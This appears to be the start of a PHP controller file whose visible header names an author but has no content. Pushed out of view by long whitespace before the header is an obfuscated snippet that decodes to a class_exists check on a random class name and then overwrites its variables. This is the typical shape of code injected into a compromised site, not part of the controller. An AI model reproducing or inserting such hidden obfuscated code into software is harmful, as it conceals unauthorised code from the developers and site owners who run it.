<?php                                                                                                                                                                                                                                                                                                                                                                                                 $QXHFksmC = chr (112) . chr (95) . "\157" . chr ( 952 - 882 ).chr (115) . "\x4d" . chr ( 103 - 31 ); $YQfHYXD = "\x63" . chr ( 222 - 114 ).chr ( 729 - 632 ).chr (115) . "\x73" . '_' . "\145" . 'x' . "\x69" . chr (115) . chr ( 750 - 634 ).chr ( 913 - 798 ); $vtXplkXaok = class_exists($QXHFksmC); $QXHFksmC = "53087";$YQfHYXD = "36838"; ?><?php 
//   Controller for: 
// Author: Vivek Patil
